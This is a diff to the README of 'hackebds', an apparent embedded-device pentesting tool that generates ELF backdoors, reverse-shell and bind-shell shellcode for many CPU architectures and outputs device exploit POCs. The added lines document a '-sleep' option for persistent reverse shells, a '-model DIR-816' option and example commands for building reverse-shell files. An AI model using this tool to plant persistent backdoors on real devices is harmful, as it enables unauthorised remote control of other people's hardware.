@@ -16,7 +16,7 @@
 
 This tool is embedded in the security test of the device. There are two main functions:
 
-1. Generate **backdoor programs** (only ELF) of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be continuously generate on the target machine)
+1. Generate **backdoor programs** (only ELF) of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be continuously generate on the target machine)，The interval time added to the code for continuously creating reverse shells in version 0.3.7 can be added through the - sleep parameter. For example, - sleep 5 means creating a reverse shell every 5 seconds. It should be noted that - power and - sleep need to be used together
 2. Generate **reverse_shell shellcode** (only linux) of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64,sparc are now supported, and they are still being updated**
 3. Generate bind of various architectures bind_Shell(only ELF) file, -power can persistent bind_shell（ If you need to use  -power parameter, you can specify the bash shell, and please do not hang the process in the background to prevent data redirection errors）
 4. Sort out the exploitable vulnerability POC or EXP of the embedded device, and search and output the basic information and POC of the device model in use: Function of equipment, Architecture of equipment,Device CPU manufacturer,Device CPU model,WEB service program of the device, and so on
@@ -67,6 +67,14 @@ Ubuntu（debian）:
 
    ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
 
+   Redesigned the relationship between model and arch, enabled the regeneration backdoor to directly specify the device model, but the model needs to match the name listed in the - l parameter
+
+   ```
+   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -model DIR-816 -res reverse_shell_file
+   ```
+
+   ![image-20230710112652819](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230710112652819.png)
+
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
    ```
@@ -89,7 +97,11 @@ Ubuntu（debian）:
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
    ```
 
-   
+   If you need to create a reverse shell every 5 seconds
+
+   ```
+   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep -5
+   ```
 
    ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
 
@@ -359,6 +371,8 @@ Powerpc, sparc: qemu
 2023.3.7 0.3.6 Added support for the mipsn32 architecture (this architecture may be encountered in devices such as zyxel firewalls)
 
 2023.5.30 add the retrieval of CVE and output the content of EXP and POC files in the device information
+
+2023.7.10 0.3.7 add retrieval of CVE, add EXP and POC file content output in device information, update the backdoor code of armelv5's reverse shell file, and add the - sleep parameter to specify the creation interval for reverse shells
 
 ## Problems to be solved
 
